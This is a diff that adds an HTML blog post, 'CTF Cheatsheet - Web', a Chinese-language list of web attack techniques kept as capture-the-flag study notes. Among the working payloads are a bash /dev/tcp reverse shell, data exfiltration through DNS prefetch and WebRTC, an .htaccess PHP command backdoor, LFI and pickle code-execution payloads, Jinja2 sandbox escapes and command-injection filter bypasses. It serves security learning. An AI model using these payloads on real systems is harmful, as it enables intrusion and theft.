@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html>
+<head><!-- hexo injector head_begin start --><!-- Microsoft Clarity begins-->
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "nq90i0uzl9");
+    </script>
+    <!-- Microsoft Clarity ends-->
+    <!-- Google tag (gtag.js) begins-->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16453505124"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'AW-16453505124');
+    </script>
+    <!-- Google tag (gtag.js) ends-->
+    <!-- hexo injector head_begin end -->
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+  <title>
+    
+    CTF Cheatsheet - Web 丨
+    
+
+    typo
+  </title>
+
+  
+  <link rel="shortcut icon" href="/icon.svg">
+  
+
+  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+  
+  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
+  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
+  
+
+  <!-- 字体 -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+
+  
+<link rel="stylesheet" href="/css/root.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/post.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <header class="header">
+  <section class="header-container">
+    <a class="logo" href="/">TriangeSnake&#39;s Blog</a>
+    <ul class="nav">
+      
+      <li><a href="/archives">archives</a></li>
+      
+      <li><a href="/about">about</a></li>
+      
+    </ul>
+  </section>
+</header>
+  <main class="main">
+    <article class="post">
+  
+  <div class="post-title">CTF Cheatsheet - Web</div>
+  <div class="post-meta">
+    <div class="date">2024 四月 30日</div>
+    <div class="tags">
+      
+      <div class="tag-item">web</div>
+      
+    </div>
+  </div>
+  
+
+  <main class="post-content"><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Information-Leak"><a href="#Information-Leak" class="headerlink" title="Information Leak"></a>Information Leak</h2><h3 id="git-svn-bzr"><a href="#git-svn-bzr" class="headerlink" title=".git &#x2F; .svn &#x2F; .bzr"></a>.git &#x2F; .svn &#x2F; .bzr</h3><p>版本控制系統</p>
+<p>.git洩漏可用scrabble將整個.git資料夾下載下來並用git 還原</p>
+<pre><code class="highlight bash">./scrabble http://www.example.com/</code></pre>
+
+<h3 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h3><pre><code class="highlight php">site:www.example.com
+intext:<span class="string">&quot;管理介面&quot;</span>
+filetype:sql</code></pre>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/google-hacking-database">GHDB</a></p>
+<p>robots.txt</p>
+<p>.DS_Store</p>
+<p>.index.php.swp</p>
+<p>Backup file</p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection">XSS Payload</a></p>
+<h3 id="CSP-怎麼偷資料"><a href="#CSP-怎麼偷資料" class="headerlink" title="CSP 怎麼偷資料"></a>CSP 怎麼偷資料</h3><p>假設他 Content Security Policy 在亂寫一通的話，可以用 <a target="_blank" rel="noopener" href="https://csp-evaluator.withgoogle.com/">CSP Evaluator</a> 檢查</p>
+<p><code>CSP</code> 沒擋用什麼偷</p>
+<p>例如 <code>CSP</code> 只有擋 <code>script</code> ，那就用 <code>&lt;img&gt;</code> 來偷</p>
+<pre><code class="highlight JSON">script-src &#x27;none&#x27;;</code></pre>
+
+<p>如果把連線都擋掉的話，還是可以使用 <code>location.href</code> 或 <code>window.open()</code> 透過跳轉來偷資料</p>
+<pre><code class="highlight JSON">default-src &#x27;none&#x27;;script-src &#x27;unsafe-inline&#x27;;</code></pre>
+
+
+
+<h4 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h4><p>允許特定第三方網站引入時，可以嘗試使用 <code>JSONP</code> 引入惡意程式碼</p>
+<pre><code class="highlight json">default-src https<span class="punctuation">:</span><span class="comment">//example.com</span></code></pre>
+
+
+<p><a target="_blank" rel="noopener" href="https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt">JSONBee</a></p>
+<h4 id="DNS-prefetch"><a href="#DNS-prefetch" class="headerlink" title="DNS prefetch"></a>DNS prefetch</h4><pre><code class="highlight html"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">dns-prefetch</span> <span class="attr">href</span>=<span class="string">[YOUR_DATA].webhook.trianglesnake.com</span>&gt;</span></code></pre>
+
+<h4 id="WebRTC"><a href="#WebRTC" class="headerlink" title="WebRTC"></a>WebRTC</h4><pre><code class="highlight javascript"><span class="keyword">var</span> pc = <span class="keyword">new</span> <span class="title class_">RTCPeerConnection</span>(&#123;
+  <span class="string">&quot;iceServers&quot;</span>:[
+      &#123;<span class="string">&quot;urls&quot;</span>:[
+        <span class="string">&quot;turn:74.125.140.127:19305?transport=udp&quot;</span>
+       ],<span class="string">&quot;username&quot;</span>:<span class="string">&quot;_all_your_data_belongs_to_us&quot;</span>,
+      <span class="string">&quot;credential&quot;</span>:<span class="string">&quot;.&quot;</span>
+    &#125;]
+&#125;);
+pc.<span class="title function_">createOffer</span>().<span class="title function_">then</span>(<span class="function">(<span class="params">sdp</span>)=&gt;</span>pc.<span class="title function_">setLocalDescription</span>(sdp);</code></pre>
+
+
+<h2 id="PHP-弱型別判斷"><a href="#PHP-弱型別判斷" class="headerlink" title="PHP 弱型別判斷"></a>PHP 弱型別判斷</h2><p><img src="/2024/04/30/CTF-Cheatsheet-Web/1.png" alt="https://i.stack.imgur.com/giVhE.png"></p>
+<p><a target="_blank" rel="noopener" href="https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/211902/">PHP弱型別的安全問題詳細總結</a></p>
+<h3 id="md5-sha1"><a href="#md5-sha1" class="headerlink" title="md5()&amp;sha1()"></a>md5()&amp;sha1()</h3><pre><code class="highlight php"><span class="title function_ invoke__">md5</span>(<span class="keyword">array</span>()) ==<span class="title function_ invoke__">sha1</span>(<span class="keyword">array</span>())<span class="comment">//true=&gt;error=error</span>
+
+<span class="title function_ invoke__">md5</span>(<span class="number">240610708</span>)==<span class="number">0</span> <span class="comment">//true</span>
+<span class="comment">/*</span>
+<span class="comment">md5(240610708)=&gt;&#x27;0e462097431906509019562988736854&#x27;</span>
+<span class="comment">在弱型別判斷中會做為科學記號和int比較</span>
+<span class="comment">*/</span>
+<span class="title function_ invoke__">sha1</span>(<span class="string">&#x27;aa3OFF9m&#x27;</span>)=&gt;<span class="string">&#x27;0e36977786278517984959260394024281014729&#x27;</span></code></pre>
+
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/shijiahao/p/12638484.html">https://www.cnblogs.com/shijiahao/p/12638484.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.twblogs.net/a/5cd66c22bd9eee67a77f66f9">https://www.twblogs.net/a/5cd66c22bd9eee67a77f66f9</a></p>
+<h2 id="header竄改"><a href="#header竄改" class="headerlink" title="header竄改"></a>header竄改</h2><h3 id="可偽造ip相關"><a href="#可偽造ip相關" class="headerlink" title="可偽造ip相關"></a>可偽造ip相關</h3><ul>
+<li><code>X-Forward-For</code></li>
+<li><code>Client-IP</code></li>
+<li><code>X-Real-IP</code></li>
+</ul>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="gopher-用法"><a href="#gopher-用法" class="headerlink" title="gopher 用法"></a>gopher 用法</h3><pre><code class="highlight jsx"><span class="attr">gopher</span>:<span class="comment">//host:port/_HTTPRequest</span>
+
+<span class="comment">//example POST request:</span>
+
+*<span class="attr">gopher</span>:<span class="comment">//192.168.0.1:8888/_POST/index.php?action=login HTTP/1.1</span>
+<span class="title class_">Host</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1000</span>
+<span class="title class_">Content</span>-<span class="attr">type</span>:application/x-www-form-urlencoded
+<span class="title class_">Content</span>-<span class="title class_">Length</span>:<span class="number">20</span>
+
+username=admin&amp;password=bupt666
+<span class="comment">//換行要用%0D%0A(\r\n)*</span></code></pre>
+<blockquote>
+<p><em>備註：發起POST的四個必要欄位</em><br>POST &#x2F;ssrf&#x2F;base&#x2F;post.php HTTP&#x2F;1.1<br>host:192.168.0.109<br>Content-Type:application&#x2F;x-www-form-urlencoded<br>Content-Length:11</p>
+</blockquote>
+<p>gopher POST request payload</p>
+<pre><code class="highlight htmlembedded">gopher://localhost:80/_POST%20/flag.php%20HTTP/1.1%0d%0AHost:%20localhost%0d%0AContent-Type:%20application/x-www-form-urlencoded%0d%0AContent-Length:%207%0d%0A%0d%0afoo=bar%0d%0A</code></pre>
+<p><a target="_blank" rel="noopener" href="https://hackmd.io/@Lhaihai/H1B8PJ9hX">https:&#x2F;&#x2F;hackmd.io&#x2F;@Lhaihai&#x2F;H1B8PJ9hX</a></p>
+<hr>
+<h2 id="LFI-RFI"><a href="#LFI-RFI" class="headerlink" title="LFI&amp;RFI"></a>LFI&amp;RFI</h2><h3 id="php-require-include"><a href="#php-require-include" class="headerlink" title="php require()&amp;include()"></a>php require()&amp;include()</h3><h4 id="偽協議"><a href="#偽協議" class="headerlink" title="偽協議"></a><strong>偽協議</strong></h4><pre><code class="highlight php"><span class="comment">//phpfilter</span>
+index.php?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=target.php</span>
+
+<span class="comment">//phar 打包成zip下載</span>
+index.php?file=phar:<span class="comment">//test.zip/target.php</span>
+
+<span class="comment">//data:URL schema</span>
+index.php?file=data:text/plain,<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span>
+index.php?file=data:text/plain;base64,**PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==**</code></pre>
+
+<p><a target="_blank" rel="noopener" href="https://codertw.com/%E5%89%8D%E7%AB%AF%E9%96%8B%E7%99%BC/384080/">data:URL schema更多用法</a></p>
+<pre><code class="highlight bash"><span class="comment">#敏感檔案</span>
+/etc/passwd // 账户信息
+
+/etc/shadow // 账户密码文件
+
+/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件
+
+/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置
+
+/usr/local/app/php5/lib/php.ini // PHP相关配置
+
+/etc/httpd/conf/httpd.conf // Apache配置文件
+
+/etc/my.conf // mysql 配置文件</code></pre>
+
+<h3 id="SESSION植入WebShell"><a href="#SESSION植入WebShell" class="headerlink" title="SESSION植入WebShell"></a><strong>SESSION植入WebShell</strong></h3><p>若session可寫入，可以利用LFI執行php</p>
+<pre><code class="highlight php">寫入<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);<span class="meta">?&gt;</span>
+index.php?file=/&lt;sess_path&gt;/sess_&lt;your session&gt;</code></pre>
+
+<p>session_path可由phpinfo內找到session.save_path，若無則放在&#x2F;tmp內</p>
+<p>&#x2F;var&#x2F;lib&#x2F;php&#x2F;session</p>
+<p>session檔名為sess_&lt;session id&gt;</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/182280.html">freebuf-LFI</a></p>
+<hr>
+<h2 id="JS-prototype-pollution"><a href="#JS-prototype-pollution" class="headerlink" title="JS prototype pollution"></a>JS prototype pollution</h2><p><a target="_blank" rel="noopener" href="https://github.com/aszx87410/blog/issues/88">基於 JS 原型鏈的攻擊手法：Prototype Pollution</a></p>
+<p>當javascript在呼叫內建函式時，會透過prototype找上一層要呼叫的函式(因為內建函式並沒有真正在乎叫的物件之中)<br>舉例來說:</p>
+<pre><code class="highlight javascript"><span class="keyword">var</span> lst = [<span class="string">&#x27;test&#x27;</span>]
+<span class="variable language_">console</span>.<span class="title function_">log</span>(lst.<span class="title function_">toString</span>())</code></pre>
+<p><code>toString()</code>不可能每個宣告的Array Object都有toString()，當呼叫時必須透過prototype找到上一層然後呼叫<code>Array.toString</code></p>
+<p>所以其實在呼叫<code>lst.toString()</code>的時候其實是呼叫了<code>Array.prototype.toString()</code></p>
+<p>而哪些<code>object</code>的prototype是甚麼則定義在object的__proto__裡面</p>
+<pre><code class="highlight javascript">lst.<span class="property">__proto__</span>.<span class="property">toString</span> == <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span> <span class="comment">//true</span></code></pre>
+<p>因此，在一些情況下，有些功能可能造成prototype可以被竄改，進而導致prototype pollution</p>
+<h3 id="parse-query"><a href="#parse-query" class="headerlink" title="parse query"></a>parse query</h3><p>在對於Array進行賦值的時候，攻擊者可以透過構造key為<code>__proto__</code>達到prototype pollution</p>
+<pre><code class="highlight javascript"><span class="comment">//parseQuery function回傳一個parsed的dict</span>
+<span class="keyword">function</span> <span class="title function_">parseQuery</span>(<span class="params">queryString</span>) &#123;
+  <span class="keyword">const</span> params = &#123;&#125;;
+  queryString.<span class="title function_">split</span>(<span class="string">&#x27;&amp;&#x27;</span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">param</span> =&gt;</span> &#123;
+    <span class="keyword">const</span> [key, value] = param.<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>);
+    params[key] = value;
+  &#125;);
+  <span class="keyword">return</span> params;
+&#125;
+
+<span class="comment">// Example usage</span>
+<span class="keyword">const</span> userInput = <span class="string">&#x27;user=admin&amp;isAdmin=true&#x27;</span>;
+
+<span class="comment">// Parsing user input</span>
+<span class="keyword">const</span> parsedQuery = <span class="title function_">parseQuery</span>(userInput);
+<span class="variable language_">console</span>.<span class="title function_">log</span>(parsedQuery);  <span class="comment">// Output: &#123; user: &#x27;admin&#x27;, isAdmin: &#x27;true&#x27; &#125;</span>
+
+<span class="comment">// 透過prototype pollution把驗證機制竄改掉，繞過檢查機制</span>
+<span class="title function_">parseQuery</span>(<span class="string">&#x27;user=admin&amp;isAdmin=true&amp;__proto__.isAdmin=true&#x27;</span>);
+
+<span class="comment">// isAdmin被竄改，return true</span>
+<span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;&#125;.<span class="property">isAdmin</span>);  <span class="comment">// Output: true</span></code></pre>
+<h3 id="合併物件"><a href="#合併物件" class="headerlink" title="合併物件"></a>合併物件</h3><p>合併物件同樣有可能發生</p>
+<pre><code class="highlight javascript"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">a, b</span>) &#123;
+  <span class="keyword">for</span>(<span class="keyword">let</span> prop <span class="keyword">in</span> b) &#123;
+    <span class="keyword">if</span> (<span class="keyword">typeof</span> a[prop] === <span class="string">&#x27;object&#x27;</span>) &#123;
+      <span class="title function_">merge</span>(a[prop], b[prop])
+    &#125; <span class="keyword">else</span> &#123;
+      a[prop] = b[prop]
+    &#125;
+  &#125; 
+&#125;
+
+<span class="keyword">var</span> config = &#123;
+  <span class="attr">a</span>: <span class="number">1</span>,
+  <span class="attr">b</span>: &#123;
+    <span class="attr">c</span>: <span class="number">2</span>
+  &#125;
+&#125;
+
+<span class="keyword">var</span> customConfig = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;isAdmin&quot;: 1&#125;&#125;&#x27;</span>)
+<span class="title function_">merge</span>(config, customConfig)
+
+<span class="keyword">var</span> obj = &#123;&#125;
+<span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">isAdmin</span>)</code></pre>
+
+<p>不難看出，其實只要有對Object的key和value進行操作，就很有可能導致prototype pollution</p>
+<hr>
+<h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>可影響apache伺服器中資料夾內的檔案</p>
+<p><strong>利用指定404、403等錯誤響應文件達成LFI</strong></p>
+<pre><code class="highlight php">ErrorDocument <span class="number">404</span> /flag.txt
+ErrorDocument <span class="number">404</span> /shell.php</code></pre>
+
+<p><strong>強制解析非php檔案造成RCE</strong></p>
+<pre><code class="highlight php">AddType application/x-httpd-php .txt</code></pre>
+
+<p><strong>將.htaccess本身作為php執行後門</strong></p>
+<pre><code class="highlight php">php_value auto_prepend_file .htaccess
+<span class="comment">#&lt;?php echo system($_GET[&#x27;cmd&#x27;]); ?&gt;</span></code></pre>
+
+<p>#為.htaccess的註解符號</p>
+<p><strong>若有WAF則可用\換行繞過</strong></p>
+<pre><code class="highlight php">p\
+hp_value auto_prepend_file .htaccess
+<span class="comment">#&lt;?=echo system($_GET[&#x27;cmd&#x27;]); ?&gt;</span></code></pre>
+
+
+<p>遇到\時，會接續下一行</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/116666720">https://blog.csdn.net/solitudi/article/details/116666720</a></p>
+<h2 id="Serialize-Deserialize"><a href="#Serialize-Deserialize" class="headerlink" title="Serialize&amp;Deserialize"></a>Serialize&amp;Deserialize</h2><p>呼叫反序列化時，可能呼叫一些Magic Method</p>
+<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><table>
+<thead>
+<tr>
+<th>Value</th>
+<th>Serialize(PHP)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>8459302</td>
+<td>i:8459302;</td>
+</tr>
+<tr>
+<td>TRUE</td>
+<td>b:1;</td>
+</tr>
+<tr>
+<td>NULL</td>
+<td>N;</td>
+</tr>
+<tr>
+<td>[’x’,1]</td>
+<td>a:2:{i:0;s:1:”x”;i:1;i:1;}</td>
+</tr>
+</tbody></table>
+<p><strong>PHP Object的序列化</strong></p>
+<pre><code class="highlight php"><span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&quot;kitten&quot;</span>) =&gt;O:<span class="number">3</span>:<span class="string">&quot;Cat&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;kitten&quot;</span>;&#125;
+
+<span class="class"><span class="keyword">class</span> <span class="title">Cat</span></span>&#123;
+	<span class="keyword">public</span> <span class="variable">$a</span>;  =&gt;&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;.....&#125;
+	<span class="keyword">private</span> <span class="variable">$b</span>; =&gt;&#123;s:<span class="number">6</span>:<span class="string">&quot;\x00Cat\x00b&quot;</span>;.....&#125;
+	<span class="keyword">protected</span> <span class="variable">$c</span>; =&gt;&#123;s:<span class="number">4</span>:<span class="string">&quot;\x00*\x00c&quot;</span>;.....&#125;
+&#125;</code></pre>
+
+<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><pre><code class="highlight php">PHP Magic Method
+在指定時機自動呼叫magic method
+<span class="title function_ invoke__">__destruct</span>() <span class="comment">//Object 被銷毀或garbage collection</span>
+<span class="title function_ invoke__">__wakeup</span>() <span class="comment">//unserialize時觸發</span>
+<span class="title function_ invoke__">__call</span>() <span class="comment">//被呼叫不存在方法時觸發</span>
+<span class="title function_ invoke__">__toString</span>() <span class="comment">//被當成string處理時觸發(如 echo)</span>
+</code></pre>
+
+<pre><code class="highlight python">**Python Pickle**
+pickle.dumps()會將資料序列化
+可寫payloads
+<span class="keyword">import</span> subprocess
+<span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):
+    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):
+        <span class="keyword">return</span> (subprocess.check_output,([<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;/flag_5fb2acebf1d0c558&#x27;</span>],))
+再想辦法把payload()塞進dumps裡面</code></pre>
+
+<h3 id="Phar與反序列化"><a href="#Phar與反序列化" class="headerlink" title="Phar與反序列化"></a>Phar與反序列化</h3><pre><code class="highlight php"></code></pre>
+
+<hr>
+<h2 id="SSTI-Server-Side-Template-Injection"><a href="#SSTI-Server-Side-Template-Injection" class="headerlink" title="SSTI(Server Side Template Injection)"></a>SSTI(Server Side Template Injection)</h2><p><img src="/2024/04/30/CTF-Cheatsheet-Web/2.png"></p>
+<p>python Flask預設模板為Jinja2</p>
+<pre><code class="highlight python">render_template_string(template)
+<span class="comment">#可做一些簡單運算</span>
+template=&#123;&#123;<span class="number">7</span>*<span class="number">7</span>&#125;&#125; =&gt;<span class="number">49</span>
+
+&#123;%<span class="keyword">for</span> item <span class="keyword">in</span> item_list %&#125;
+	&#123;&#123; item &#125;&#125;&#123;% <span class="keyword">if</span> <span class="keyword">not</span> loop.last %&#125;,&#123;% endif %&#125;
+&#123;%-endfor-%&#125;
+<span class="string">&#x27;&#x27;&#x27;</span>
+<span class="string">可以import os os.system()嗎? 不行，code是放在sandbox中跑的</span>
+<span class="string">但可以用config.from_pyfile(filename)執行任意python檔案</span>
+<span class="string">&#x27;&#x27;&#x27;</span></code></pre>
+
+<p>使用_mro_(Method Resolution Order) <strong>bypass Python的Sandbox</strong></p>
+<pre><code class="highlight python">[].__class__ =&gt;&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;
+<span class="comment">#對object 查詢method</span>
+
+[].__class__.__mro__ =&gt;(&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;,&lt;<span class="keyword">class</span> <span class="string">&#x27;object&gt;)</span>
+<span class="string">#_mro_可查詢解析物件順序，此時可以發現所有物件的底層皆為object</span>
+<span class="string"></span>
+<span class="string">[].__class__.__base__ =&gt;&lt;class &#x27;</span><span class="built_in">object</span><span class="string">&#x27;&gt;</span>
+<span class="string">#_base_可返回最底層的method,所以返回object</span>
+<span class="string"></span>
+<span class="string">[].__class_.__base_.__subclasses__()</span>
+<span class="string">#_subclasses_直接返回所有subclasses，猛了object在最底層，所以所有物件都會return</span>
+<span class="string"></span>
+<span class="string">[].__class__.__base__.__subclasses__()[132] =&gt;&lt;class &#x27;</span>os._wrap_close<span class="string">&#x27;&gt;</span>
+<span class="string">#os出現了</span>
+<span class="string"></span>
+<span class="string">[].__class__.__base__.__subclasses__()[132].__init__.__globals__ =&gt;返回所有可被global調用的method</span>
+<span class="string"></span>
+<span class="string">&#123;&#123;[].__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;</span>system<span class="string">&#x27;](&#x27;</span>ls<span class="string">&#x27;)&#125;&#125;</span>
+<span class="string">#os.system被A出來了</span>
+<span class="string"></span>
+<span class="string">&#123;&#123;[].__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;</span>popen<span class="string">&#x27;](&#x27;</span>ls<span class="string">&#x27;).read()&#125;&#125;</span>
+<span class="string">#回傳結果</span></code></pre>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md">SSTI Payload</a><br>更多奇技淫巧:<a target="_blank" rel="noopener" href="https://tw511.com/a/01/48066.html">https://tw511.com/a/01/48066.html</a></p>
+<h2 id="SQL-injection"><a href="#SQL-injection" class="headerlink" title="SQL injection"></a>SQL injection</h2><p><a target="_blank" rel="noopener" href="https://www.796t.com/content/1545706659.html">https://www.796t.com/content/1545706659.html</a><br><a target="_blank" rel="noopener" href="https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/">https://zu1k.com/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/</a></p>
+<h3 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h3><pre><code class="highlight plaintext">MySQL
+#comment
+-- comment     [Note the space after the double dash]
+/*comment*/
+/*! MYSQL Special SQL */
+
+PostgreSQL
+--comment
+/*comment*/
+
+MSQL
+--comment
+/*comment*/
+
+Oracle
+--comment
+
+SQLite
+--comment
+/*comment*/
+
+HQL
+HQL does not support Comments</code></pre>
+
+
+
+<h3 id="常見waf"><a href="#常見waf" class="headerlink" title="常見waf"></a>常見waf</h3><pre><code class="highlight sql"><span class="keyword">escape</span>()<span class="operator">-</span><span class="operator">&gt;</span>被轉成<span class="operator">%</span>XX，@<span class="operator">*</span> _ <span class="operator">+</span> <span class="operator">-</span> . <span class="operator">/</span>不編碼</code></pre>
+
+<h3 id="waf繞過"><a href="#waf繞過" class="headerlink" title="waf繞過"></a>waf繞過</h3><pre><code class="highlight html">
+&#x27;弄不出來的時候可以嘗試兩個urlencode合在一起
+%bf%27、%df%27、%aa%27</code></pre>
+
+<h2 id="Reversed-Shell"><a href="#Reversed-Shell" class="headerlink" title="Reversed Shell"></a>Reversed Shell</h2><pre><code class="highlight bash">最經典
+nc -klvp [port] <span class="comment">#attacker&#x27;s host</span>
+/bin/sh -i &gt;&amp; /dev/tcp/[host]/[port] 0&lt;&amp;1 <span class="comment">#victim</span></code></pre>
+
+<p>問就是 <a target="_blank" rel="noopener" href="https://www.revshells.com/">revshells.com</a></p>
+<h2 id="Commandline-Injection"><a href="#Commandline-Injection" class="headerlink" title="Commandline Injection"></a>Commandline Injection</h2><h3 id="截斷指令"><a href="#截斷指令" class="headerlink" title="截斷指令"></a>截斷指令</h3><p>最基本的截斷可用<code>;</code>達成，也可使用</p>
+<ul>
+<li><code>cmd1&amp;&amp;cmd2</code>當<code>cmd1</code> 執行成功時執行<code>cmd2</code></li>
+<li><code>cmd1&amp;cmd2</code>簡單拼接，無論<code>cmd1</code>執行成功與否都會執行<code>cmd2</code></li>
+<li><code>cmd1||cmd2</code>當<code>cmd1</code>執行失敗時執行&#96;cmd2</li>
+<li><code>cmd1|cmd2</code>將<code>cmd1</code>的執行結果以pipeline塞給<code>cmd2</code></li>
+<li>可以將指令包在 <code>\</code>`<code>或是</code>$()&#96; 之中</li>
+</ul>
+<h3 id="空格繞過"><a href="#空格繞過" class="headerlink" title="空格繞過"></a>空格繞過</h3><ul>
+<li>使用<code>&lt;&gt;</code>繞過<ul>
+<li><code>cat&lt;flag</code></li>
+<li><code>cat&lt;&gt;flag</code></li>
+</ul>
+</li>
+<li><code>&#123;cat,flag&#125;</code></li>
+<li>使用特殊變量<code>$IFS</code>繞過(預設是空格)<ul>
+<li><code>cat$IFS./flag</code></li>
+<li><code>cat$IFS\flag</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="過濾繞過"><a href="#過濾繞過" class="headerlink" title="過濾繞過"></a>過濾繞過</h3><ul>
+<li>regex繞過<ul>
+<li><code>/usr/bin/ca? flag</code></li>
+</ul>
+</li>
+<li>反斜線繞過<ul>
+<li><code>ca\t fl\ag</code></li>
+</ul>
+</li>
+<li>空變量繞過<ul>
+<li><code>ca$&#123;Z&#125;t flag</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="一些猛料"><a href="#一些猛料" class="headerlink" title="一些猛料"></a>一些猛料</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/tardis/zm/art/339266206?source_id=1003">https://www.zhihu.com/tardis/zm/art/339266206?source_id=1003</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_61011147/article/details/126722464">https://blog.csdn.net/m0_61011147/article/details/126722464</a></p>
+</blockquote>
+<h2 id="一些會一直旺季的東東"><a href="#一些會一直旺季的東東" class="headerlink" title="一些會一直旺季的東東"></a>一些會一直旺季的東東</h2><p><img src="/2024/04/30/CTF-Cheatsheet-Web/3.png"></p>
+<p><img src="/2024/04/30/CTF-Cheatsheet-Web/4.gif"></p>
+<h2 id="更多筆記"><a href="#更多筆記" class="headerlink" title="更多筆記"></a>更多筆記</h2><p><a target="_blank" rel="noopener" href="https://github.com/splitline/How-to-Hack-Websites">https://github.com/splitline/How-to-Hack-Websites</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/splitline/My-CTF-Challenges/">https://github.com/splitline/My-CTF-Challenges/</a></p>
+<p><a target="_blank" rel="noopener" href="https://medium.com/%E8%B3%87%E5%AD%90%E4%B9%8B%E6%89%8B-%E5%AE%89%E4%B9%8B%E4%BD%A0%E6%88%91/%E8%B3%87%E5%AE%89%E6%96%B0%E6%89%8B%E5%85%A5%E9%96%80%E6%89%8B%E5%86%8A-web-security-%E9%A0%98%E8%88%AA%E4%B9%8B%E8%B7%AF-8d634d9228b5">[資安新手入門手冊] Web Security 領航之路</a></p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/">简介 - CTF Wiki</a></p>
+<p><a target="_blank" rel="noopener" href="https://edu-ctf.csie.org/"></a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/w181496/Web-CTF-Cheatsheet">https://github.com/w181496/Web-CTF-Cheatsheet</a></p>
+</main>
+
+</article>
+
+
+<script src="/js/highlight.js"></script>
+
+  </main>
+  <footer class="footer">
+  
+  <span>Copyright © TriangleSnake</span>
+  
+</footer>
+  
+<script src="/js/theme.js"></script>
+
+</body>
+
+</html>
